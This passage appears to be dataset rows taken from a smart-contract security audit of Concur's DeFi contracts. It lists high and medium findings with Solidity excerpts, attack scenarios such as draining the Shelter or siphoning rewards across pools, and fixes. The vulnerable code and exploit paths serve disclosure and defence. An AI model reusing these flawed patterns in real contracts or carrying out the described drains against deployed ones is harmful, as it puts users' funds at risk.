`ConvexStakingWrapper`, `StakingRewards` can utilize these two functions and get the accounting right.

```solidity
function depositFor(address _user, uint _pid, uint _amount) external nonReentrant onlyDepositor {
    PoolInfo storage pool = poolInfo[_pid];
    UserInfo storage user = userInfo[_pid][_user];
```





***"
83.md,"`USDMPegRecovery` Risk of fund locked, due to discrepancy between curveLP token value against internal contract math",high,"[USDMPegRecovery.sol#L90](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/USDMPegRecovery.sol#L90)<br>
[USDMPegRecovery.sol#L110](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/USDMPegRecovery.sol#L110)<br>
[USDMPegRecovery.sol#L73](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/USDMPegRecovery.sol#L73)<br>
[USDMPegRecovery.sol#L84](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/USDMPegRecovery.sol#L84)<br>

In `USDMPegRecovery` `deposit` and `withdraw` allow for direct deposits of a specific token (3crv or usdm).

The balances are directly changed and tracked in storage.

`provide` seems to be using the real balances (not the ones store) to provide liquidity.<br>
Because of how curve works, you'll be able (first deposit) to provide exactly matching liquidity.<br>
But after (even just 1 or) multiple swaps, the pool will be slightly imbalanced, adding or removing liquidity at that point will drastically change the balances in the contract from the ones tracked in storage.

Eventually users won't be able to withdraw the exact amounts they deposited.

This will culminate with real balances not matching user deposits, sometimes to user advantage and other times to user disadvantage, ultimately to the protocol dismay.

### Proof of Concept

Deposit equal usdm and 3crv<br>
LP<br>
Do one trade on CRV<br>
Withdraw the LP

The real balances are not matching the balances in storage.

User tries to withdraw all their balances, inevitable revert.

### Recommended Mitigation Steps

Either find a way to price the user contribution based on the LP tokens (use virtual_price)<br>
Or simply have people deposit the LP token directly (avoiding the IL math which is a massive headache)






***"
83.md,`ConvexStakingWrapper.sol#_calcRewardIntegral` Wrong implementation can disrupt rewards calculation and distribution,high,"[ConvexStakingWrapper.sol#L175-L204](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/ConvexStakingWrapper.sol#L175-L204)<br>

```solidity
    uint256 bal = IERC20(reward.token).balanceOf(address(this));
    uint256 d_reward = bal - reward.remaining;
    // send 20 % of cvx / crv reward to treasury
    if (reward.token == cvx || reward.token == crv) {
        IERC20(reward.token).transfer(treasury, d_reward / 5);
        d_reward = (d_reward * 4) / 5;
    }
    IERC20(reward.token).transfer(address(claimContract), d_reward);

    if (_supply > 0 && d_reward > 0) {
        reward.integral =
            reward.integral +
            uint128((d_reward * 1e20) / _supply);
    }

    //update user integrals
    uint256 userI = userReward[_pid][_index][_account].integral;
    if (userI < reward.integral) {
        userReward[_pid][_index][_account].integral = reward.integral;
        claimContract.pushReward(
            _account,
            reward.token,
            (_balance * (reward.integral - userI)) / 1e20
        );
    }

    //update remaining reward here since balance could have changed if claiming
    if (bal != reward.remaining) {
        reward.remaining = uint128(bal);
    }
```

The problems in the current implementation:

*   `reward.remaining` is not a global state; the `reward.remaining` of other `reward`s with the same rewardToken are not updated;
*   `bal` should be refreshed before `reward.remaining = uint128(bal);`;
*   L175 should not use `balanceOf` but take the diff before and after `getReward()`.

### Proof of Concept

*   convexPool\[1] is incentivized with CRV as the reward token, `1000 lpToken` can get `10 CRV` per day;
*   convexPool\[2] is incentivized with CRV as the reward token, `1000 lpToken` can get `20 CRV` per day.

1.  Alice deposits `1,000` lpToken to `_pid` = `1`
2.  1 day later, Alice deposits `500` lpToken to `_pid` = `1`

*   convexPool `getReward()` sends `10 CRV` as reward to contract
*   `d_reward` = 10, `2 CRV` sends to `treasury`, `8 CRV` send to `claimContract`
*   `rewards[1][0].remaining` = 10

3.  0.5 day later, Alice deposits `500` lpToken to `_pid` = `1`, and the tx will fail:

*   convexPool `getReward()` sends `7.5 CRV` as reward to contract
*   `reward.remaining` = 10
*   `bal` = 7.5
*   `bal - reward.remaining` will fail due to underflow

4.  0.5 day later, Alice deposits `500` lpToken to `_pid` = `1`, most of the reward tokens will be left in the contract:

*   convexPool `getReward()` sends `15 CRV` as reward to the contract;
*   `d_reward = bal - reward.remaining` = 5
*   `1 CRV` got sent to `treasury`, `4 CRV` sent to `claimContract`, `10 CRV` left in the contract;
*   `rewards[1][0].remaining` = 15

Expected Results:

All the `15 CRV` get distributed: `3 CRV` to the `treasury`, and `12 CRV` to `claimContract`.

Actual Results:

Only `5 CRV` got distributed. The other `10 CRV` got left in the contract which can be frozen in the contract, see below for the details:

5.  Bob deposits `1,000` lpToken to `_pid` = `2`

*   convexPool `getReward()` sends `0 CRV` as reward to the contract
*   `d_reward = bal - reward.remaining` = 10
*   `2 CRV` sent to `treasury`, `8 CRV` sent to `claimContract` without calling `pushReward()`, so the `8 CRV` are now frozen in `claimContract`;
*   `rewards[2][0].remaining` = 10

### Impact

*   The two most important methods: `deposit()` and `withdraw()` will frequently fail as the tx will revert at `_calcRewardIntegral()`;
*   Rewards distributed to users can often be fewer than expected;
*   If there are different pools that use the same token as rewards, part of the rewards can be frozen at `claimContract` and no one can claim them.

### Recommended Mitigation Steps

Consider comparing the `balanceOf` reward token before and after `getReward()` to get the actual rewarded amount, and `reward.remaining` should be removed.



 > Because `_calRewardIntegral` is a core functionality of the contract (giving out reward) and the warden has shown how it can be broken, I agree with High Severity.



***"
83.md,Shelter `claimed` mapping is set with `_to` address and not `msg.sender`,high,"Any user can withdraw all the funds from the shelter. This is done by calling withdraw repeatedly until all funds are drained. You only need to have a small share.

Even if the `claimed` mapping was checked, there would still be a vulnerability. This is because the `claimed` mapping is updated with the `_to` address, not the `msg.sender` address.

### Recommended Mitigation Steps

Remediation is to change the `_to` to `msg.sender`.<br>
[Shelter.sol#L55](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/Shelter.sol#L55)






***"
83.md,`MasterChef.sol` Users won't be able to receive the `concur` rewards,high,"According to:

*   [README](https://github.com/code-423n4/2022-02-concur#-masterchef)
*   Implementation of `deposit()`: [/contracts/MasterChef.sol#L157-L180](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/MasterChef.sol#L157-L180)

MasterChef is only recording the deposited amount in the states, it's not actually holding the `depositToken`.

`depositToken` won't be transferred from `_msgSender()` to the MasterChef contract.

Therefore, in `updatePool()` L140 `lpSupply = pool.depositToken.balanceOf(address(this))` will always be `0`. And the `updatePool()` will be returned at L147.

[MasterChef.sol#L135-L154](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/MasterChef.sol#L135-L154)

```solidity
function updatePool(uint _pid) public {
    PoolInfo storage pool = poolInfo[_pid];
    if (block.number <= pool.lastRewardBlock) {
        return;
    }
    uint lpSupply = pool.depositToken.balanceOf(address(this));
    if (lpSupply == 0 || pool.allocPoint == 0) {
        pool.lastRewardBlock = block.number;
        return;
    }
    if(block.number >= endBlock) {
        pool.lastRewardBlock = block.number;
        return;
    }        

    uint multiplier = getMultiplier(pool.lastRewardBlock, block.number);
    uint concurReward = multiplier.mul(concurPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
    pool.accConcurPerShare = pool.accConcurPerShare.add(concurReward.mul(_concurShareMultiplier).div(lpSupply));
    pool.lastRewardBlock = block.number;
}
```

### Impact

*   The MasterChef contract fail to implement the most essential function;
*   Users won't be able to receive any `Concur` rewards from MasterChef;

### Recommended Mitigation Steps

Consider creating a receipt token to represent the invested token and use the receipt tokens in MasterChef.

See: <https://github.com/convex-eth/platform/blob/883ffd4ebcaee12e64d18f75bdfe404bcd900616/contracts/contracts/Booster.sol#L272-L277>






***"
83.md,deposit in `ConvexStakingWrapper` will most certainly revert,high,"[ConvexStakingWrapper.sol#L94-L99](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L94-L99)<br>

```solidity
        address mainPool = IRewardStaking(convexBooster)
            .poolInfo(_pid)
            .crvRewards;
        if (rewards[_pid].length == 0) {
            pids[IRewardStaking(convexBooster).poolInfo(_pid).lptoken] = _pid;
            convexPool[_pid] = mainPool;
```

`convexPool[_pid]` is set to `IRewardStaking(convexBooster).poolInfo(_pid).crvRewards;`

`crvRewards` is a `BaseRewardPool` like this one: <https://etherscan.io/address/0x8B55351ea358e5Eda371575B031ee24F462d503e#code>.

`BaseRewardPool` does not implement `poolInfo`

[ConvexStakingWrapper.sol#L238](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L238)

```solidity
IRewardStaking(convexPool[_pid]).poolInfo(_pid).lptoken
```

Above line calls `poolInfo` of  `crvRewards` which causes revert.

### Recommended Mitigation Steps

According to Booster's code

<https://etherscan.io/address/0xF403C135812408BFbE8713b5A23a04b3D48AAE31#code>

```solidity
    //deposit lp tokens and stake
    function deposit(uint256 _pid, uint256 _amount, bool _stake) public returns(bool){
        require(!isShutdown,""shutdown"");
        PoolInfo storage pool = poolInfo[_pid];
        require(pool.shutdown == false, ""pool is closed"");

        //send to proxy to stake
        address lptoken = pool.lptoken;
        IERC20(lptoken).safeTransferFrom(msg.sender, staker, _amount);
```

`convexBooster` requires `poolInfo[_pid].lptoken`.

change L238 to

```solidity
IRewardStaking(convexBooster).poolInfo(_pid).lptoken
```






***"
83.md,"`ConvexStakingWrapper.exitShelter()` Will Lock LP Tokens, Preventing Users From Withdrawing",high,"The shelter mechanism provides emergency functionality in an effort to protect users' funds. The `enterShelter` function will withdraw all LP tokens from the pool, transfer them to the shelter contract and activate the shelter for the target LP token. Conversely, the `exitShelter` function will deactivate the shelter and transfer all LP tokens back to the `ConvexStakingWrapper.sol` contract.

Unfortunately, LP tokens aren't restaked in the pool, causing LP tokens to be stuck within the contract. Users will be unable to withdraw their LP tokens as the `withdraw` function attempts to `withdrawAndUnwrap` LP tokens from the staking pool. As a result, this function will always revert due to insufficient staked balance. If other users decide to deposit their LP tokens, then these tokens can be swiped by users who have had their LP tokens locked in the contract.

This guarantees poor UX for the protocol and will most definitely lead to LP token loss.

### Proof of Concept

[ConvexStakingWrapper.sol#L121-L130](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/ConvexStakingWrapper.sol#L121-L130)

    function exitShelter(uint256[] calldata _pids) external onlyOwner {
        for(uint256 i = 0; i<_pids.length; i++){
            IRewardStaking pool = IRewardStaking(convexPool[_pids[i]]);
            IERC20 lpToken = IERC20(
                pool.poolInfo(_pids[i]).lptoken
            );
            amountInShelter[lpToken] = 0;
            shelter.deactivate(lpToken);
        }
    }

[ConvexStakingWrapper.sol#L309-L331](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/ConvexStakingWrapper.sol#L309-L331)

    function withdraw(uint256 _pid, uint256 _amount)
        external
        nonReentrant
        whenNotInShelter(_pid)
    {
        WithdrawRequest memory request = withdrawRequest[_pid][msg.sender];
        require(request.epoch < currentEpoch() && deposits[_pid][msg.sender].epoch + 1 < currentEpoch(), ""wait"");
        require(request.amount >= _amount, ""too much"");
        _checkpoint(_pid, msg.sender);
        deposits[_pid][msg.sender].amount -= uint192(_amount);
        if (_amount > 0) {
            IRewardStaking(convexPool[_pid]).withdrawAndUnwrap(_amount, false);
            IERC20 lpToken = IERC20(
                IRewardStaking(convexPool[_pid]).poolInfo(_pid).lptoken
            );
            lpToken.safeTransfer(msg.sender, _amount);
            uint256 pid = masterChef.pid(address(lpToken));
            masterChef.withdraw(msg.sender, pid, _amount);
        }
        delete withdrawRequest[_pid][msg.sender];
        //events
        emit Withdrawn(msg.sender, _amount);
    }

### Tools Used

Manual code review.<br>
Confirmation from Taek.

### Recommended Mitigation Steps

Consider re-depositing LP tokens upon calling `exitShelter`. This should ensure the same tokens can be reclaimed by users wishing to exit the `ConvexStakingWrapper.sol` contract.







***"
83.md,`ConvexStakingWrapper._calcRewardIntegral()` Can Be Manipulated To Steal Tokens From Other Pools,high,"The `ConvexStakingWrapper.sol` implementation makes several modifications to the original design. One of the key changes is the ability to add multiple pools into the wrapper contract, where each pool is represented by a unique `_pid`. By doing this, we are able to aggregate pools and their LP tokens to simplify the token distribution process.

However, the interdependence between pools introduces new problems. Because the original implementation uses the contract's reward token balance to track newly claimed tokens, it is possible for a malicious user to abuse the unguarded `getReward` function to maximise the profit they are able to generate. By calling `getReward` on multiple pools with the same reward token (i.e. `cvx`), users are able to siphon rewards from other pools. This inevitably leads to certain loss of rewards for users who have deposited LP tokens into these victim pools. As `crv` and `cvx` are reward tokens by default, it is very likely that someone will want to exploit this issue.

### Proof of Concept

Let's consider the following scenario:

*   There are two convex pools with `_pid` 0 and 1.
*   Both pools currently only distribute `cvx` tokens.
*   Alice deposits LP tokens into the pool with `_pid` 0.
*   Both pools earn 100 `cvx` tokens which are to be distributed to the holders of the two pools.
*   While Alice is a sole staker of the pool with `_pid` 0, the pool with `_pid` 1 has several stakers.
*   Alice decides she wants to maximise her potential rewards, so she directly calls the unguarded `IRewardStaking(convexPool[_pid]).getReward` function on both pools, resulting in 200 `cvx` tokens being sent to the contract.
*   She then decides to deposit the 0 amount to execute the `_calcRewardIntegral` function on the pool with `_pid` 0. However, this function will calculate `d_reward` as `bal - reward.remaining` which is effectively the change in contract balance. As we have directly claimed `cvx` tokens over the two pools, this `d_reward` will be equal to 200.
*   Alice is then entitled to the entire 200 tokens as she is the sole staker of her pool. So instead of receiving 100 tokens, she is able to siphon rewards from other pools.

Altogether, this will lead to the loss of rewards for other stakers as they are unable to then claim their rewards.

[ConvexStakingWrapper.sol#L216-L259](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/ConvexStakingWrapper.sol#L216-L259)

    function _calcRewardIntegral(
        uint256 _pid,
        uint256 _index,
        address _account,
        uint256 _balance,
        uint256 _supply
    ) internal {
        RewardType memory reward = rewards[_pid][_index];

        //get difference in balance and remaining rewards
        //getReward is unguarded so we use remaining to keep track of how much was actually claimed
        uint256 bal = IERC20(reward.token).balanceOf(address(this));
        uint256 d_reward = bal - reward.remaining;
        // send 20 % of cvx / crv reward to treasury
        if (reward.token == cvx || reward.token == crv) {
            IERC20(reward.token).transfer(treasury, d_reward / 5);
            d_reward = (d_reward * 4) / 5;
        }
        IERC20(reward.token).transfer(address(claimContract), d_reward);

        if (_supply > 0 && d_reward > 0) {
            reward.integral =
                reward.integral +
                uint128((d_reward * 1e20) / _supply);
        }

        //update user integrals
        uint256 userI = userReward[_pid][_index][_account].integral;
        if (userI < reward.integral) {
            userReward[_pid][_index][_account].integral = reward.integral;
            claimContract.pushReward(
                _account,
                reward.token,
                (_balance * (reward.integral - userI)) / 1e20
            );
        }

        //update remaining reward here since balance could have changed if claiming
        if (bal != reward.remaining) {
            reward.remaining = uint128(bal);
        }

        rewards[_pid][_index] = reward;
    }

### Tools Used

Manual code review.<br>
Confirmation from Taek.

### Recommended Mitigation Steps

Consider redesigning this mechanism such that all pools have their `getReward` function called in `_checkpoint`. The `_calcRewardIntegral` function can then ensure that each pool is allocated only a fraction of the total rewards instead of the change in contract balance. Other implementations might be more ideal, so it is important that careful consideration is taken when making these changes.






***"
83.md,Deposits after the grace period should not be allowed,medium,"[Shelter.sol#L34](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/Shelter.sol#L34)<br>
[Shelter.sol#L54](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/Shelter.sol#L54)<br>

Function donate in Shelter shouldn't allow new deposits after the grace period ends, when the claim period begins.<br>
Otherwise, it will be possible to increase savedTokens\[\_token], and thus new user claim amounts will increase after some users might already have withdrawn their shares.

### Recommended Mitigation Steps

Based on my understanding, it should contain this check:

```solidity
  require(activated[_token] + GRACE_PERIOD > block.timestamp, ""too late"");
```






***"
83.md,Unconstrained fee,medium,"[MasterChef.sol#L86-L101](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L86-L101)<br>

Token fee in `MasterChef` can be set to more than 100%, (for example, by accident) causing all `deposit` calls to fail due to underflow on subtraction when reward is lowered by the fee, thus breaking essential mechanics. Note that after the fee has been set to any value, it cannot be undone. A token cannot be removed, added, or added the second time. Thus, mistakenly (or deliberately, maliciously) added fee that is larger than 100% will make the contract impossible to recover from not being able to use the token.

### Recommended Mitigation Steps

On setting fee ensure that it is below a set maximum, which is set to no more than 100%.






***"
83.md,`USDMPegRecovery.sol#withdraw()` withdraw may often fail,medium,"Per the doc:

> USDM deposits are locked based on the KPI’s from carrot.eth.

> 3Crv deposits are not locked.

[USDMPegRecovery.sol#L110-L128](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/USDMPegRecovery.sol#L110-L128)<br>

```solidity
function withdraw(Liquidity calldata _withdrawal) external {
        Liquidity memory total = totalLiquidity;
        Liquidity memory user = userLiquidity[msg.sender];
        if(_withdrawal.usdm > 0) {
            require(unlockable, ""!unlock usdm"");
            usdm.safeTransfer(msg.sender, uint256(_withdrawal.usdm));
            total.usdm -= _withdrawal.usdm;
            user.usdm -= _withdrawal.usdm;
        }

        if(_withdrawal.pool3 > 0) {
            pool3.safeTransfer(msg.sender, uint256(_withdrawal.pool3));
            total.pool3 -= _withdrawal.pool3;
            user.pool3 -= _withdrawal.pool3;
        }
        totalLiquidity = total;
        userLiquidity[msg.sender] = user;
        emit Withdraw(msg.sender, _withdrawal);
    }
```

However, because the `withdraw()` function takes funds from the balance of the contract, once the majority of the funds are added to the curve pool via `provide()`. The `withdraw()` may often fail due to insufficient funds in the balance.

### Proof of Concept

1.  Alice deposits `4M` USDM and `4M` pool3 tokens;
2.  Guardian calls `provide()` and all the `usdm` and `pool3` to `usdm3crv`;
3.  Alice calls `withdraw()`, the tx will fail, due to insufficient balance.

### Recommended Mitigation Steps

Consider calling `usdm3crv.remove_liquidity_one_coin()` when the balance is insufficient for the user's withdrawal.






***"
83.md,`USDMPegRecovery.sol#provide()` Improper design/implementation make it often unable to add liquidity to the `usdm3crv` pool,medium,"[USDMPegRecovery.sol#L73-L82](https://github.com/code-423n4/2022-02-concur/blob/02d286253cd5570d4e595527618366f77627cdaf/contracts/USDMPegRecovery.sol#L73-L82)<br>

```solidity
function provide(uint256 _minimumLP) external onlyGuardian {
    require(usdm.balanceOf(address(this)) >= totalLiquidity.usdm, ""<liquidity"");
    // truncate amounts under step
    uint256 addingLiquidity = (usdm.balanceOf(address(this)) / step) * step;
    // match usdm : pool3 = 1 : 1
    uint256[2] memory amounts = [addingLiquidity, addingLiquidity];
    usdm.approve(address(usdm3crv), addingLiquidity);
    pool3.approve(address(usdm3crv), addingLiquidity);
    usdm3crv.add_liquidity(amounts, _minimumLP);
}
```

In the current implementation of `USDMPegRecovery.sol#provide()`, `addingLiquidity` is calculated solely based on `usdm` balance (truncate at a step of 250k), and it always uses the same amount of 3pool tokens to add_liquidity with.

Based on other functions of the contract, the balance of `usdm` can usually be more than the `pool3` balance, in that case, `usdm3crv.add_liquidity()` will fail.

### Impact

When the balance of `pool3` is less than `usdm` (which is can be a common scenario), funds cannot be added to the curve pool.

For example:

When the contract got 5M of USDM and 4.2M of `pool3` tokens, it won't be possible to call `provide()` and add liquidity to the `usdm3crv` pool, as there are not enough pool3 tokens to match the 5M of USDM yet.

We expect it to add liquidity with 4M of USDM and 4M of pool3 tokens in that case.

### Recommended Mitigation Steps

Change to:

```solidity
function provide(uint256 _minimumLP) external onlyGuardian {
    require(usdm.balanceOf(address(this)) >= totalLiquidity.usdm, ""<liquidity"");
    uint256 tokenBalance = Math.min(usdm.balanceOf(address(this), pool3.balanceOf(address(this));
    // truncate amounts under step
    uint256 addingLiquidity = (tokenBalance / step) * step;
    // match usdm : pool3 = 1 : 1
    uint256[2] memory amounts = [addingLiquidity, addingLiquidity];
    usdm.approve(address(usdm3crv), addingLiquidity);
    pool3.approve(address(usdm3crv), addingLiquidity);
    usdm3crv.add_liquidity(amounts, _minimumLP);
}
```






***"
83.md,USDM locked unless guardian remove liquidity,medium,"In README.me:

> USDM deposits are locked based on the KPI’s from carrot.eth

However, USDM deposits are also locked until guardian remove liquidity because there are no mechanism to remove deposited USDM in `withdraw`.

[USDMPegRecovery.sol#L90](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/USDMPegRecovery.sol#L90)<br>






***"
83.md,`StakingRewards.sol` `recoverERC20()` can be used as a backdoor by the `owner` to retrieve `rewardsToken`,medium,"[StakingRewards.sol#L166-L176](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/StakingRewards.sol#L166-L176)<br>

```solidity
    function recoverERC20(address tokenAddress, uint256 tokenAmount)
        external
        onlyOwner
    {
        require(
            tokenAddress != address(stakingToken),
            ""Cannot withdraw the staking token""
        );
        IERC20(tokenAddress).safeTransfer(owner(), tokenAmount);
        emit Recovered(tokenAddress, tokenAmount);
    }
```

### Impact

Users can lose all the rewards to the malicious/compromised `owner`.

### Recommended Mitigation Steps

Change to:

```solidity
 function recoverERC20(
    address tokenAddress,
    address to,
    uint256 amount
) external onlyOwner {
    require(tokenAddress != address(stakingToken) && tokenAddress != address(rewardsToken), ""20"");

    IERC20(tokenAddress).safeTransfer(to, amount);
    emit Recovered(tokenAddress, to, amount);
}
```






***"
83.md,Fee-on-transfer token donations in `Shelter` break withdrawals,medium,"[Shelter.sol#L34](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/Shelter.sol#L34)<br>

The `Sheler.donate` function `transferFrom`s `_amount` and adds the entire `_amount` to `savedTokens[_token]`.<br>
But the actual received token amount from the transfer can be less for fee-on-transfer tokens.

The last person to withdraw will not be able to as `withdraw` uses a share computation for the entire `savedTokens[_token]` amount.<br>
The calculated `amount` will then be higher than the actual contract balance.

```solidity
function donate(IERC20 _token, uint256 _amount) external {
    require(activated[_token] != 0, ""!activated"");
    savedTokens[_token] += _amount;
    // @audit fee-on-transfer. then fails for last person in `withdraw`
    _token.safeTransferFrom(msg.sender, address(this), _amount);
}

function withdraw(IERC20 _token, address _to) external override {
    // @audit percentage on storage var, not on actual balance
    uint256 amount = savedTokens[_token] * client.shareOf(_token, msg.sender) / client.totalShare(_token);
    // @audit amount might not be in contract anymore as savedTokens[_token] is over-reported
    _token.safeTransfer(_to, amount);
}
```

### Recommended Mitigation Steps

In `donate`, add only the actual transferred amounts (computed by `post-transfer balance - pre-transfer balance`) to `savedTokens[_token]`.






***"
83.md,Donated Tokens Cannot Be Recovered If A Shelter Is Deactivated,medium,"The shelter mechanism can be activated and deactivated on a target LP token. The owner of the `ConvexStakingWrapper.sol` contract can initiate the shelter whereby LP tokens are sent to the `Shelter.sol` contract. However, if the owner decides to deactivate the shelter before the grace period has passed, all LP tokens are transferred back to the `ConvexStakingWrapper.sol` contract. Donated tokens are also sent back to the contract. As a result, these tokens do not actually belong to any user and will effectively be lost in the contract.

#### Proof of Concept

[Shelter.sol#L32-L36](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/Shelter.sol#L32-L36)<br>

    function donate(IERC20 _token, uint256 _amount) external {
        require(activated[_token] != 0, ""!activated"");
        savedTokens[_token] += _amount;
        _token.safeTransferFrom(msg.sender, address(this), _amount);
    }

[ConvexStakingWrapper.sol#L107-L130](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/ConvexStakingWrapper.sol#L107-L130)<br>

    function enterShelter(uint256[] calldata _pids) external onlyOwner {
        for(uint256 i = 0; i<_pids.length; i++){
            IRewardStaking pool = IRewardStaking(convexPool[_pids[i]]);
            uint256 amount = pool.balanceOf(address(this));
            pool.withdrawAndUnwrap(amount, false);
            IERC20 lpToken = IERC20(
                pool.poolInfo(_pids[i]).lptoken
            );
            amountInShelter[lpToken] = amount;
            lpToken.safeTransfer(address(shelter), amount);
            shelter.activate(lpToken);
        }
    }

    function exitShelter(uint256[] calldata _pids) external onlyOwner {
        for(uint256 i = 0; i<_pids.length; i++){
            IRewardStaking pool = IRewardStaking(convexPool[_pids[i]]);
            IERC20 lpToken = IERC20(
                pool.poolInfo(_pids[i]).lptoken
            );
            amountInShelter[lpToken] = 0;
            shelter.deactivate(lpToken);
        }
    }

### Recommended Mitigation Steps

Consider allocating donated LP tokens to the contract owner when a shelter is deactivated. This can be done by checking for an excess of LP tokens. Anything greater than `amountInShelter` can be considered as donated.






***"
83.md,`StakingRewards.sol#notifyRewardAmount()` Improper reward balance checks can make some users unable to withdraw their rewards,medium,"[StakingRewards.sol#L154-L158](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/StakingRewards.sol#L154-L158)<br>

```solidity
    uint256 balance = rewardsToken.balanceOf(address(this));
    require(
        rewardRate <= balance / rewardsDuration,
        ""Provided reward too high""
    );
```

In the current implementation, the contract only checks if balanceOf `rewardsToken` is greater than or equal to the future rewards.

However, under normal circumstances, since users can not withdraw all their rewards in time, the balance in the contract contains rewards that belong to the users but have not been withdrawn yet. This means the current checks can not be sufficient enough to make sure the contract has enough amount of rewardsToken.

As a result, if the `rewardsDistribution` mistakenly `notifyRewardAmount` with a larger amount, the contract may end up in a wrong state that makes some users unable to claim their rewards.

### Proof of Concept

Given:

*   rewardsDuration = 7 days;

1.  Alice stakes `1,000` stakingToken;
2.  `rewardsDistribution` sends `100` rewardsToken to the contract;
3.  `rewardsDistribution` calls `notifyRewardAmount()` with `amount` = `100`;
4.  7 days later, Alice calls `earned()` and it returns `100` rewardsToken, but Alice choose not to `getReward()` for now;
5.  `rewardsDistribution` calls `notifyRewardAmount()` with `amount` = `100` without send any fund to contract, the tx will succees;
6.  7 days later, Alice calls `earned()` `200` rewardsToken, when Alice tries to call `getReward()`, the transaction will fail due to insufficient balance of rewardsToken.

Expected Results:

The tx in step 5 should revert.

### Recommended Mitigation Steps

Consider changing the function `notifyRewardAmount` to `addRward` and use `transferFrom` to transfer rewardsToken into the contract:

```solidity
function addRward(uint256 reward)
    external
    updateReward(address(0))
{
    require(
        msg.sender == rewardsDistribution,
        ""Caller is not RewardsDistribution contract""
    );

    if (block.timestamp >= periodFinish) {
        rewardRate = reward / rewardsDuration;
    } else {
        uint256 remaining = periodFinish - block.timestamp;
        uint256 leftover = remaining * rewardRate;
        rewardRate = (reward + leftover) / rewardsDuration;
    }

    rewardsToken.safeTransferFrom(msg.sender, address(this), reward);

    lastUpdateTime = block.timestamp;
    periodFinish = block.timestamp + rewardsDuration;
    emit RewardAdded(reward);
}
```






***"
83.md,Users Will Lose Rewards If The Shelter Mechanism Is Enacted Before A Recent Checkpoint,medium,"The shelter mechanism aims to protect the protocol's users by draining funds into a separate contract in the event of an emergency. However, while users are able to reclaim their funds through the `Shelter.sol` contract, they will still have a deposited balance from the perspective of `ConvexStakingWrapper.sol`.

Because users will only receive their rewards upon depositing/withdrawing their funds due to how the checkpointing mechanism works, it is likely that by draining funds to the `Shelter.sol` contract, users will lose out on any rewards they had accrued up and until that point. These rewards are unrecoverable and can potentially be locked within the contract if the reward token is unique and only belongs to the sheltered `_pid`.

### Proof of Concept

[ConvexStakingWrapper.sol](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/ConvexStakingWrapper.sol)<br>

### Recommended Mitigation Steps

Consider allowing users to call a public facing `_checkpoint` function once their funds have been drained to the `Shelter.sol` contract. This should ensure they receive their fair share of rewards. Careful consideration needs to be made when designing this mechanism, as by giving users full control of the `_checkpoint` function may allow them to continue receiving rewards after they have withdrawn their LP tokens.






***"
83.md,`ConvexStakingWrapper.enterShelter()` May Erroneously Overwrite `amountInShelter` Leading To Locked Tokens,medium,"The shelter mechanism provides emergency functionality in an effort to protect users' funds. The `enterShelter` function will withdraw all LP tokens from the pool, transfer them to the shelter contract and activate the shelter for the target LP token. If this function is called again on the same LP token, the `amountInShelter` value is overwritten, potentially by the zero amount. As a result  its possible that the shelter is put in a state where no users can withdraw from it or only a select few users with a finite number of shares are able to. Once the shelter has passed its grace period, these tokens may forever be locked in the shelter contract.

### Proof of Concept

[ConvexStakingWrapper.sol#L107-L119](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/ConvexStakingWrapper.sol#L107-L119)<br>

    function enterShelter(uint256[] calldata _pids) external onlyOwner {
        for(uint256 i = 0; i<_pids.length; i++){
            IRewardStaking pool = IRewardStaking(convexPool[_pids[i]]);
            uint256 amount = pool.balanceOf(address(this));
            pool.withdrawAndUnwrap(amount, false);
            IERC20 lpToken = IERC20(
                pool.poolInfo(_pids[i]).lptoken
            );
            amountInShelter[lpToken] = amount;
            lpToken.safeTransfer(address(shelter), amount);
            shelter.activate(lpToken);
        }
    }

[ConvexStakingWrapper.sol#L132-L135](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/ConvexStakingWrapper.sol#L132-L135)<br>

    function totalShare(IERC20 _token) external view override returns(uint256) {
        // this will be zero if shelter is not activated
        return amountInShelter[_token];
    }

### Recommended Mitigation Steps

Consider adding to the `amountInShelter[lpToken]` mapping instead of overwriting it altogether. This will allow `enterShelter` to be called multiple times with no loss of funds for the protocol's users.






***"
83.md,`USDMPegRecovery.provide()` Will Fail If There Is An Excess Of `usdm` Tokens,medium,"The `provide` function does not take a `_steps` argument and will instead calculate `addingLiquidity` by truncating amounts under `step`. As a result, if there is an excess of `usdm` such that the truncated amount exceeds the contract's `pool3` truncated balance, then the function will revert due to insufficient `pool3` collateral.

This will prevent guardians from effectively providing liquidity whenever tokens are available. Consider the following example:

